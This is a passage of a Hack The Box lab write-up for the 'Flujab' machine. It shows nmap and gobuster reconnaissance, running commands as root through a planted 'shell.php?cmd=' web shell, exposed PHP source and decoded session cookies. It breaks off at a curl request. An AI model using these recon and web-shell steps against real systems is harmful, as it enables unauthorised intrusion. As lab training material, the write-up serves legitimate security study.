I"ﬂ<h1 id="htb-flujab-101010124-machine-write-up">HTB Flujab (10.10.10.124) MACHINE WRITE-UP</h1>

<h3 id="table-of-contents">TABLE OF CONTENTS</h3>

<hr />

<h2 id="part-1--initial-recon">PART 1 : INITIAL RECON</h2>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">nmap --min-rate 1000 -p- -v 10.10.10.124
</span></code></pre></div></div>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy
</code></pre></div></div>
<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">nmap -oN flujab.nmap -p22,80,443,8080 -sC -sV -v 10.10.10.124
</span></code></pre></div></div>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE  VERSION
22/tcp   open  ssh?
80/tcp   open  http     nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: ClownWare Proxy
|_http-title: Did not follow redirect to https://10.10.10.124/
443/tcp  open  ssl/http nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: ClownWare Proxy
|_http-title: Direct IP access not allowed | ClownWare
| ssl-cert: Subject: commonName=ClownWare.htb/organizationName=ClownWare Ltd/stateOrProvinceName=LON/countryName=UK
| Subject Alternative Name: DNS:clownware.htb, DNS:sni147831.clownware.htb, DNS:*.clownware.htb, DNS:proxy.clownware.htb, DNS:console.flujab.htb, DNS:sys.flujab.htb, DNS:smtp.flujab.htb, DNS:vaccine4flu.htb, DNS:bestmedsupply.htb, DNS:custoomercare.megabank.htb, DNS:flowerzrus.htb, DNS:chocolateriver.htb, DNS:meetspinz.htb, DNS:rubberlove.htb, DNS:freeflujab.htb, DNS:flujab.htb
| Issuer: commonName=ClownWare Certificate Authority/organizationName=ClownWare Ltd./stateOrProvinceName=LON/countryName=UK
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-11-28T14:57:03
| Not valid after:  2023-11-27T14:57:03
| MD5:   1f22 1ef7 c8bf d110 dfe6 2b6f 0765 2245
|_SHA-1: 7013 803a 92b3 f1f0 735d 404b 733c 712b bea6 ffcc
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
8080/tcp open  ssl/http nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: ClownWare Proxy
|_http-title: Direct IP access not allowed | ClownWare
| ssl-cert: Subject: commonName=ClownWare.htb/organizationName=ClownWare Ltd/stateOrProvinceName=LON/countryName=UK
| Subject Alternative Name: DNS:clownware.htb, DNS:sni147831.clownware.htb, DNS:*.clownware.htb, DNS:proxy.clownware.htb, DNS:console.flujab.htb, DNS:sys.flujab.htb, DNS:smtp.flujab.htb, DNS:vaccine4flu.htb, DNS:bestmedsupply.htb, DNS:custoomercare.megabank.htb, DNS:flowerzrus.htb, DNS:chocolateriver.htb, DNS:meetspinz.htb, DNS:rubberlove.htb, DNS:freeflujab.htb, DNS:flujab.htb
| Issuer: commonName=ClownWare Certificate Authority/organizationName=ClownWare Ltd./stateOrProvinceName=LON/countryName=UK
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-11-28T14:57:03
| Not valid after:  2023-11-27T14:57:03
| MD5:   1f22 1ef7 c8bf d110 dfe6 2b6f 0765 2245
|_SHA-1: 7013 803a 92b3 f1f0 735d 404b 733c 712b bea6 ffcc
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
</code></pre></div></div>
<p><strong>NOTE(S)</strong>:</p>
<ul>
  <li>A couple of <strong>DNS</strong> were captured by <strong><code class="highlighter-rouge">nmap</code></strong></li>
</ul>

<hr />

<h2 id="part-2--port-enumeration">PART 2 : PORT ENUMERATION</h2>

<ul>
  <li>Add the domain names to <strong>/etc/hosts</strong>:
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1       localhost
127.0.1.1       kali f
10.10.10.124    clownware.htb              ///DEAD END
10.10.10.124    sni147831.clownware.htb    ///DEAD END
10.10.10.124    *.clownware.htb            ///DEAD END
10.10.10.124    proxy.clownware.htb        ///DEAD END
10.10.10.124    console.flujab.htb         ///DEAD END
10.10.10.124    sys.flujab.htb             ///DEAD END
10.10.10.124    smtp.flujab.htb            
10.10.10.124    vaccine4flu.htb            ///DEAD END
10.10.10.124    bestmedsupply.htb          ///DEAD END 
10.10.10.124    custoomercare.megabank.htb 
10.10.10.124    flowerzrus.htb             ///DEAD END
10.10.10.124    chocolateriver.htb         ///DEAD END
10.10.10.124    meetspinz.htb              ///DEAD END
10.10.10.124    rubberlove.htb             ///DEAD END 
10.10.10.124    freeflujab.htb
10.10.10.124    flujab.htb                 ///DEAD END

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</code></pre></div>    </div>
    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>Most of the domains contain either an embedded image or video</li>
      <li><strong>bestmedsupply.htb</strong> and <strong>flowerzrus.htb</strong> only contains static <strong><em>.html</em></strong> pages</li>
    </ul>
  </li>
</ul>

<h3 id="tcp-port-443-httpscustoomercaremegabankhtb"><strong>TCP PORT 443</strong> (<strong><code class="highlighter-rouge">https://custoomercare.megabank.htb</code></strong>)</h3>

<ul>
  <li>
    <p>Landing Page:</p>

    <p><img src="./screenshots/443_custoomercare_megabank.png" alt="custoomercare.megabank.htb" /></p>

    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li><code class="highlighter-rouge">The site ahead may contain harmful programs</code>
        <blockquote>

        </blockquote>
      </li>
    </ul>
  </li>
  <li>Run <code class="highlighter-rouge">gobuster</code>:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>gobuster <span class="nt">-k</span> <span class="nt">-u</span> https://custoomercare.megabank.htb <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-x</span> php
<span class="go">  
</span><span class="gp">  [-] Wildcard response found: https://custoomercare.megabank.htb/48a44669-2c2f-4568-ac60-9d92eb6396db =&gt;</span><span class="w"> </span>301
<span class="go">
</span></code></pre></div>    </div>
    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>All <code class="highlighter-rouge">404</code> requests are redirected (<code class="highlighter-rouge">301</code>) to https://clownware.htb/cwerror_pages.php</li>
      <li>
        <p>The error page:</p>

        <p><img src="./screenshots/443_cwerror.gif" alt="cwerror" /></p>
      </li>
    </ul>
  </li>
  <li>Run <code class="highlighter-rouge">gobuster</code> but limit to <code class="highlighter-rouge">200</code> responses:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>gobuster <span class="nt">-k</span> <span class="nt">-s</span> 200 <span class="nt">-u</span> https://custoomercare.megabank.htb <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-x</span> php
<span class="go">      
  /index.php (Status: 200)
  /shell.php (Status: 200)
  
</span></code></pre></div>    </div>
  </li>
  <li><strong><code class="highlighter-rouge">https://custoomercare.megabank.htb/shell.php</code></strong>:
    <ul>
      <li>Page Source:
        <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--
53cret 5shell
shell.php?cmd=[commands]
--&gt;</span>
</code></pre></div>        </div>
        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li>The webpage seems to accept shell commands
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Pass commands:
    <ul>
      <li><code class="highlighter-rouge">?cmd=id</code> returns <code class="highlighter-rouge">uid=0(root) gid=0(root) groups=0(root)</code></li>
      <li><code class="highlighter-rouge">?cmd=ls</code> returns <code class="highlighter-rouge">root.txt</code></li>
      <li>
        <p><code class="highlighter-rouge">?cmd=cat root.txt</code> returns:</p>

        <p><img src="./screenshots/443_megabank_shell.png" alt="Megabank Shell" /></p>
      </li>
    </ul>

    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>The webpage is just a troll</li>
    </ul>
  </li>
</ul>

<h3 id="tcp-port-443-httpssmtpflujabhtb"><strong>TCP PORT 443</strong> (<strong><code class="highlighter-rouge">https://smtp.flujab.htb/</code></strong>)</h3>

<ul>
  <li>
    <p>Landing Page:</p>

    <p><img src="./screenshots/443_smtp_flujab.png" alt="smtp.flujab.htb" /></p>
  </li>
  <li>
    <p>Page Source:</p>
    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...omitted...

        <span class="c">&lt;!-- Header --&gt;</span>
        <span class="nt">&lt;section</span> <span class="na">id=</span><span class="s">"header"</span> <span class="na">class=</span><span class="s">"wrapper style3"</span><span class="nt">&gt;</span>
   
            <span class="c">&lt;!-- Logo --&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"logo"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;h1&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/?login"</span><span class="nt">&gt;</span>SMTP Mail Configuration<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>
                <span class="nt">&lt;/br&gt;</span>
                <span class="c">&lt;!-- NOW DEPRICATED! This function has been integrated into the new free service application!--&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/section&gt;</span>
  
...omitted...

    <span class="nt">&lt;h2&gt;</span>Log in here for your Mail-in-a-Box control panel.<span class="nt">&lt;/h2&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">class=</span><span class="s">"form-horizontal"</span> <span class="na">role=</span><span class="s">"form"</span> <span class="na">onsubmit=</span><span class="s">"do_login(); return false;"</span><span class="nt">&gt;</span>

...
</code></pre></div>    </div>
    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li>The ‚Äúfree service application‚Äù might be referring to <strong>freeflujab.htb</strong></li>
      <li><strong>do_login()</strong> function:
        <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">do_login</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#loginEmail</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">()</span> <span class="o">==</span> <span class="dl">""</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">show_modal_error</span><span class="p">(</span><span class="dl">"</span><span class="s2">Login Failed</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Enter your email address.</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
 	 <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#loginEmail</span><span class="dl">'</span><span class="p">).</span><span class="nx">focus</span><span class="p">();</span>
    <span class="p">});</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#loginPassword</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">()</span> <span class="o">==</span> <span class="dl">""</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">show_modal_error</span><span class="p">(</span><span class="dl">"</span><span class="s2">Login Failed</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">Enter your email password.</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#loginPassword</span><span class="dl">'</span><span class="p">).</span><span class="nx">focus</span><span class="p">();</span>
    <span class="p">});</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="c1">// Exchange the email address &amp; password for an API key.</span>
  <span class="nx">api_credentials</span> <span class="o">=</span> <span class="p">[</span><span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#loginEmail</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">(),</span> <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#loginPassword</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">()]</span>
  <span class="nx">api</span><span class="p">(</span>
  <span class="dl">"</span><span class="s2">/me</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span>
  <span class="p">{</span> <span class="p">},</span>
  <span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">){</span> 
    <span class="c1">// This API call always succeeds. It returns a JSON object indicating</span>
    <span class="c1">// whether the request was authenticated or not.</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">status</span> <span class="o">!=</span> <span class="dl">"</span><span class="s2">ok</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
      <span class="c1">// Show why the login failed.</span>
      <span class="nx">show_modal_error</span><span class="p">(</span><span class="dl">"</span><span class="s2">Login Failed</span><span class="dl">"</span><span class="p">,</span> <span class="nx">response</span><span class="p">.</span><span class="nx">reason</span><span class="p">)</span>
      <span class="c1">// Reset any saved credentials.</span>
      <span class="nx">do_logout</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="dl">"</span><span class="s2">api_key</span><span class="dl">"</span> <span class="k">in</span> <span class="nx">response</span><span class="p">))</span> <span class="p">{</span>
      <span class="c1">// Login succeeded but user might not be authorized!</span>
      <span class="nx">show_modal_error</span><span class="p">(</span><span class="dl">"</span><span class="s2">Login Failed</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">You are not an administrator on this system.</span><span class="dl">"</span><span class="p">)</span>
      <span class="c1">// Reset any saved credentials.</span>
      <span class="nx">do_logout</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="c1">// Login succeeded.</span>
      <span class="c1">// Save the new credentials.</span>
      <span class="nx">api_credentials</span> <span class="o">=</span> <span class="p">[</span><span class="nx">response</span><span class="p">.</span><span class="nx">email</span><span class="p">,</span> <span class="nx">response</span><span class="p">.</span><span class="nx">api_key</span><span class="p">];</span>
      <span class="c1">// Try to wipe the username/password information.</span>
      <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#loginEmail</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">(</span><span class="dl">''</span><span class="p">);</span>
      <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#loginPassword</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">(</span><span class="dl">''</span><span class="p">);</span>
      <span class="c1">// Remember the credentials.</span>
      <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">localStorage</span> <span class="o">!=</span> <span class="dl">'</span><span class="s1">undefined</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="k">typeof</span> <span class="nx">sessionStorage</span> <span class="o">!=</span> <span class="dl">'</span><span class="s1">undefined</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">#loginRemember</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">())</span> <span class="p">{</span>
          <span class="nx">localStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="dl">"</span><span class="s2">miab-cp-credentials</span><span class="dl">"</span><span class="p">,</span> <span class="nx">api_credentials</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="dl">"</span><span class="s2">:</span><span class="dl">"</span><span class="p">));</span>
          <span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">removeItem</span><span class="p">(</span><span class="dl">"</span><span class="s2">miab-cp-credentials</span><span class="dl">"</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
          <span class="nx">localStorage</span><span class="p">.</span><span class="nx">removeItem</span><span class="p">(</span><span class="dl">"</span><span class="s2">miab-cp-credentials</span><span class="dl">"</span><span class="p">);</span>
          <span class="nx">sessionStorage</span><span class="p">.</span><span class="nx">setItem</span><span class="p">(</span><span class="dl">"</span><span class="s2">miab-cp-credentials</span><span class="dl">"</span><span class="p">,</span> <span class="nx">api_credentials</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="dl">"</span><span class="s2">:</span><span class="dl">"</span><span class="p">));</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="c1">// Open the next panel the user wants to go to. Do this after the XHR response</span>
      <span class="c1">// is over so that we don't start a new XHR request while this one is finishing,</span>
      <span class="c1">// which confuses the loading indicator.</span>
      <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="nx">show_panel</span><span class="p">(</span><span class="o">!</span><span class="nx">switch_back_to_panel</span> <span class="o">||</span> <span class="nx">switch_back_to_panel</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">login</span><span class="dl">"</span> <span class="p">?</span> <span class="dl">'</span><span class="s1">system_status</span><span class="dl">'</span> <span class="p">:</span> <span class="nx">switch_back_to_panel</span><span class="p">)</span> <span class="p">},</span> <span class="mi">300</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">})</span>
<span class="p">}</span>
</code></pre></div>        </div>
        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li><strong>api()</strong> is not defined anywhere</li>
          <li>The login functionality might be a <strong>RABBIT HOLE</strong></li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<h3 id="tcp-port-443-httpsfreeflujabhtb"><strong>TCP PORT 443</strong> (<strong><code class="highlighter-rouge">https://freeflujab.htb/</code></strong>)</h3>
<ul>
  <li>
    <p>Landing Page:</p>

    <p><img src="./screenshots/443_freeflujab.png" alt="freeflujab.htb" /></p>

    <p><strong>NOTE(S)</strong>:</p>
    <ul>
      <li><strong><em>/?cancel</em></strong> redirects to <strong><em>/?ERROR=NOT_REGISTERED</em></strong></li>
      <li><strong><em>/?remind</em></strong> redirects to <strong><em>/?ERROR=NOT_REGISTERED</em></strong></li>
      <li>The other links seem to work fine
        <blockquote>

        </blockquote>
      </li>
    </ul>
  </li>
  <li>view-source:https://freeflujab.htb/favicon.ico
    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
<span class="nb">define</span><span class="p">(</span><span class="s1">'SafeIncludes'</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">);</span>
<span class="k">require_once</span><span class="p">(</span><span class="s1">'includes/get_host.php'</span><span class="p">);</span>
<span class="c1">//                                                                                              /$$              </span>
<span class="k">include</span><span class="p">(</span><span class="s1">'includes/tokens.php'</span><span class="p">);</span><span class="c1">//                                                               | $$              </span>
<span class="c1">//   /$$$$$$$  /$$$$$$  /$$   /$$  /$$$$$$   /$$$$$$$  /$$$$$$         /$$$$$$$  /$$$$$$   /$$$$$$$  /$$$$$$     </span>
<span class="c1">//  /$$_____/ /$$__  $$| $$  | $$ /$$__  $$ /$$_____/ /$$__  $$       /$$_____/ /$$__  $$ /$$__  $$ /$$__  $$    </span>
<span class="c1">// |  $$$$$$ | $$  \ $$| $$  | $$| $$  \__/| $$      | $$$$$$$$      | $$      | $$  \ $$| $$  | $$| $$$$$$$$    </span>
<span class="c1">//  \____  $$| $$  | $$| $$  | $$| $$      | $$      | $$_____/      | $$      | $$  | $$| $$  | $$| $$_____/    </span>
<span class="c1">//  /$$$$$$$/|  $$$$$$/|  $$$$$$/| $$      |  $$$$$$$|  $$$$$$$      |  $$$$$$$|  $$$$$$/|  $$$$$$$|  $$$$$$$    </span>
<span class="c1">// |_______/  \______/  \______/ |__/       \_______/ \_______/       \_______/ \______/  \_______/ \_______/    </span>
<span class="k">include</span><span class="p">(</span><span class="s1">'includes/actions.php'</span><span class="p">);</span>                                                                                                              
<span class="c1">//                                                                                                    /$$ /$$ /$$</span>
<span class="k">include</span><span class="p">(</span><span class="s1">'includes/header.php'</span><span class="p">);</span><span class="c1">//                                                                    | $$| $$| $$</span>
<span class="c1">//                    /$$   /$$  /$$$$$$  /$$   /$$ /$$   /$$ /$$   /$$ /$$   /$$  /$$$$$$   /$$$$$$ | $$| $$| $$</span>
<span class="c1">//                   | $$  | $$ |____  $$| $$  | $$| $$  | $$| $$  | $$| $$  | $$ /$$__  $$ /$$__  $$| $$| $$| $$</span>
<span class="c1">//                   | $$  | $$  /$$$$$$$| $$  | $$| $$  | $$| $$  | $$| $$  | $$| $$$$$$$$| $$$$$$$$|__/|__/|__/</span>
<span class="c1">//                   | $$  | $$ /$$__  $$| $$  | $$| $$  | $$| $$  | $$| $$  | $$| $$_____/| $$_____/            </span>
<span class="c1">//                   |  $$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$$ /$$ /$$ /$$</span>
<span class="c1">//                    \____  $$ \_______/ \____  $$ \____  $$ \____  $$ \____  $$ \_______/ \_______/|__/|__/|__/</span>
<span class="c1">//                    /$$  | $$           /$$  | $$ /$$  | $$ /$$  | $$ /$$  | $$                                </span>
<span class="c1">//                   |  $$$$$$/          |  $$$$$$/|  $$$$$$/|  $$$$$$/|  $$$$$$/                                </span>
<span class="c1">//                    \______/            \______/  \______/  \______/  \______/                                 </span>
<span class="k">include</span><span class="p">(</span><span class="s1">'includes/scripts.php'</span><span class="p">);</span>
<span class="c1">//                                                  ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ        </span>
<span class="c1">//                                             ‚ñÑ‚ñÑ‚ñÄ‚ñÄ‚ñÄ‚ñÄ          ‚ñÄ‚ñÄ‚ñÑ‚ñÑ    </span>
<span class="c1">//                                           ‚ñÑ‚ñÄ                   ‚ñÄ‚ñÄ‚ñÑ    </span>
<span class="c1">//                                          ‚ñà                        ‚ñà</span>
<span class="c1">//                                         ‚ñà                     ‚ñÑ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñà‚ñÑ</span>
<span class="c1">//                                        ‚ñà‚ñÄ                    ‚ñà    ‚ñÑ‚ñà‚ñà‚ñà</span>
<span class="c1">//                                        ‚ñà                     ‚ñà    ‚ñÄ‚ñà‚ñà‚ñà</span>
<span class="c1">//                                        ‚ñà     ‚ñÑ‚ñÄ‚ñÄ‚ñà‚ñà‚ñÄ‚ñÑ         ‚ñà       ‚ñà</span>
<span class="c1">//                                        ‚ñà    ‚ñà  ‚ñà‚ñà‚ñà‚ñà ‚ñà         ‚ñÄ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñà </span>
<span class="c1">//                                        ‚ñà    ‚ñà  ‚ñÄ‚ñà‚ñà‚ñÄ ‚ñà               ‚ñà</span>
<span class="c1">//                                        ‚ñà    ‚ñà       ‚ñà              ‚ñÑ‚ñÄ</span>
<span class="c1">//                                        ‚ñà    ‚ñÄ‚ñÑ     ‚ñÑ‚ñÄ  ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ   ‚ñà  </span>
<span class="c1">//                                        ‚ñà     ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ    ‚ñà  ‚ñÄ  ‚ñÄ  ‚ñà  ‚ñÑ‚ñÄ </span>
<span class="c1">//                                         ‚ñà              ‚ñÄ‚ñÑ‚ñà‚ñÑ‚ñà‚ñÑ‚ñà‚ñÄ ‚ñÑ‚ñÄ</span>
<span class="c1">//                                          ‚ñà                     ‚ñÑ‚ñÄ    </span>
<span class="k">include</span><span class="p">(</span><span class="s1">'includes/path_handler.php'</span><span class="p">);</span><span class="c1">//      ‚ñÄ‚ñÄ‚ñÄ‚ñÑ          ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÄ‚ñÄ</span>
<span class="c1">//                                            ‚ñÑ‚ñÄ         ‚ñÄ‚ñÄ  ‚ñÑ‚ñÄ </span>
<span class="c1">//                                          ‚ñÑ‚ñÄ               ‚ñà</span>
<span class="c1">//                                         ‚ñÑ‚ñÄ                ‚ñà  ‚ñÑ‚ñÄ‚ñÄ‚ñÄ‚ñà‚ñÄ‚ñÄ‚ñÑ</span>
<span class="c1">//                                         ‚ñà    ‚ñà  ‚ñà‚ñÄ‚ñÄ‚ñÄ‚ñÑ     ‚ñà‚ñÄ‚ñÄ    ‚ñà  ‚ñà</span>
<span class="c1">//                                        ‚ñÑ‚ñà    ‚ñÄ‚ñÄ‚ñÄ    ‚ñà     ‚ñà    ‚ñÄ‚ñÄ   ‚ñà</span>
<span class="c1">//                                        ‚ñà‚ñÄ‚ñÑ          ‚ñà      ‚ñà‚ñÑ       ‚ñà</span>
<span class="c1">//                                        ‚ñà  ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñà‚ñÑ‚ñÑ‚ñÑ‚ñÑ‚ñÄ       ‚ñÄ‚ñà‚ñÄ‚ñÄ‚ñÄ‚ñÑ‚ñÑ‚ñÑ‚ñÄ</span>
<span class="c1">//                                        ‚ñà                     ‚ñà</span>
<span class="c1">//                                        ‚ñà                     ‚ñà</span>
<span class="c1">//                                        ‚ñà                     ‚ñà</span>
<span class="c1">//                                         ‚ñà         ‚ñÄ‚ñÑ  ‚ñÑ‚ñÄ    ‚ñà</span>
<span class="c1">//                                          ‚ñà          ‚ñà        ‚ñÄ‚ñÑ</span>
<span class="c1">//                                           ‚ñà         ‚ñà          ‚ñà</span>
<span class="c1">//                                           ‚ñà         ‚ñà           ‚ñÄ‚ñÑ</span>
<span class="c1">//                                           ‚ñà      ‚ñÑ‚ñÄ‚ñÄ‚ñà‚ñÄ‚ñÄ‚ñÑ        ‚ñÑ‚ñÄ‚ñÄ‚ñà‚ñà‚ñÄ‚ñÑ </span>
<span class="c1">//                                           ‚ñà             ‚ñà‚ñÄ‚ñÑ            ‚ñà</span>
<span class="c1">//                                           ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ  ‚ñÄ ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ‚ñÄ</span>
<span class="k">include</span><span class="p">(</span><span class="s1">'includes/fortune.php'</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div>    </div>
    <p><strong>NOTE(S</strong>:</p>
    <ul>
      <li>The favicon.ico is <strong>not</strong> an image</li>
      <li>The content looks like the page structure of the site
        <blockquote>

        </blockquote>
      </li>
    </ul>
  </li>
  <li>Site Cookies:
    <ul>
      <li>Request:
        <pre><code class="language-pcap">Cookie: Patient=daf23866abcb8e29ecee6d3da0caa992; Registered=ZGFmMjM4NjZhYmNiOGUyOWVjZWU2ZDNkYTBjYWE5OTI9TnVsbA%3D%3D
</code></pre>
        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li>Decoded (Base64) <code class="highlighter-rouge">Registered</code> cookie: <strong>daf23866abcb8e29ecee6d3da0caa992=Null</strong></li>
          <li>It seems connected to the <code class="highlighter-rouge">Patient</code> cookie
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
      <li>Response:
        <pre><code class="language-pcap">Set-Cookie: Modus=Q29uZmlndXJlPU51bGw%3D; expires=Mon, ..-May-2019 ..:..:.. GMT; Max-Age=3600; path=/?smtp_config
</code></pre>
        <p><strong>NOTE(S)</strong>:</p>
        <ul>
          <li>Decoded (Base64) <code class="highlighter-rouge">Modus</code> cookie: <strong>Configure=Null</strong></li>
          <li>The path (<strong>/?smtp_config</strong>) for the <code class="highlighter-rouge">Modus</code> cookie seems to be the one referenced by https://smtp.flujab.htb</li>
          <li><code class="highlighter-rouge">Modus</code>, <code class="highlighter-rouge">Patient</code>, and <code class="highlighter-rouge">Registered</code> are set in the response if not requested
            <blockquote>

            </blockquote>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li><strong><code class="highlighter-rouge">https://freeflujab.htb/?smtp_config</code></strong>:
    <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>curl <span class="nt">-I</span> <span class="nt">-k</span> https://freeflujab.htb/?smtp_config
</code></pre></div>    </div>
    <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">..., .. May 2019 ..:..:.. GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
<span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">Modus=Q29uZmlndXJlPU51bGw%3D; expires=..., ..-May-2019 ..:..:.. GMT; Max-Age=3600; path=/?smtp_config</span>
